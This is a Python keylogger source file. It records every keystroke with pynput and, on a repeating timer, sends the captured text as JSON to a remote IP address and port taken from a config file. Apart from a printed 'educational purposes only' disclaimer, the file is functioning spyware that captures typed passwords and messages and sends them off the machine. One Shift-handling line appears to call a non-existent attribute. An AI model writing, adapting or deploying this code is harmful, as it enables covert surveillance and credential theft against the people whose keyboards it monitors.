# Install pynput using the following command: pip install pynput
from pynput import keyboard
import requests
import json
import threading
import logging
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("keylogger.log"), logging.StreamHandler()]
)

# Load configuration from config.json
config_path = os.path.join(os.path.dirname(__file__), "config.json")
try:
    with open(config_path, "r") as config_file:
        config = json.load(config_file)
    ip_address = config["ip_address"]  # IP address is loaded here
    port_number = config["port_number"]  # Port number is loaded here
    time_interval = config["time_interval"]
except (FileNotFoundError, KeyError, json.JSONDecodeError) as e:
    logging.error(f"Error loading configuration: {e}")
    raise SystemExit("Failed to load configuration. Ensure config.json is properly set up.")

# Global variables
text = ""
text_lock = threading.Lock()

def send_post_req():
    """Send the collected keystrokes to the server."""
    global text
    try:
        with text_lock:
            if not text.strip():  # Skip sending if no data is collected
                logging.info("No data to send.")
                return
            payload = json.dumps({"keyboardData": text})
            text = ""  # Clear text after sending
        response = requests.post(
            f"http://{ip_address}:{port_number}/api/keystrokes",  # Updated endpoint for compatibility
            data=payload,
            headers={"Content-Type": "application/json"},
            timeout=10  # Timeout to prevent hanging
        )
        response.raise_for_status()  # Raise exception for HTTP errors
        logging.info("Data sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
    finally:
        # Schedule the next execution
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()

def on_press(key):
    """Handle key press events."""
    global text
    try:
        with text_lock:
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.backspace and len(text) > 0:
                text = text[:-1]
            elif key == keyboard.Key.esc:
                return False  # Stop the listener
            elif hasattr(key, 'char') and key.char:  # Check if the key has a character representation
                if keyboard.Key.shift in keyboard.Controller().pressed_keys:  # Check if Shift is pressed
                    text += key.char.upper()  # Capitalize the letter
                else:
                    text += key.char
            else:
                text += f"[{key.name}]"  # Handle special keys like Ctrl, Alt, etc.
    except Exception as e:
        logging.error(f"Error processing key press: {e}")

if __name__ == "__main__":
    print("This keylogger is for educational purposes only. Ensure you have explicit permission before using it.")
    print("Misuse of this tool is your responsibility.")
    logging.info("Keylogger started.")
    try:
        # Start the keyboard listener
        with keyboard.Listener(on_press=on_press) as listener:
            # Start sending data to the server
            send_post_req()
            listener.join()
    except KeyboardInterrupt:
        logging.info("Keylogger stopped by user.")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        logging.info("Keylogger terminated.")